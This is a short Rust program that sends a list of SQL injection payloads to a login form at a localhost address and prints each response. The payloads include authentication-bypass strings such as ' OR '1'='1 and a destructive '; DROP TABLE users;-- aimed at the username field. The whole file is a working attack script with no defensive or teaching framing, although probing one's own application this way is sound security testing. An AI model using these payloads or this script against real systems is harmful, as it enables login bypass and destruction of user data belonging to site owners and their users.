use reqwest::Client;
use std::error::Error;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let target_url = "http://localhost:8080/login";
    let payloads = vec![
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users;--",
    ];

    let client = Client::new();

    for payload in &payloads {
        // Example: Sending payload in username param, password empty
        let params = [("username", *payload), ("password", "")];
        let res = client.post(target_url)
            .form(&params)
            .send()
            .await?;

        let status = res.status();
        let text = res.text().await?;

        println!("Payload: {}", payload);
        println!("Status: {}", status);
        println!("Response snippet: {:.100}", text);
        println!("----------------------------------");
    }

    Ok(())
}
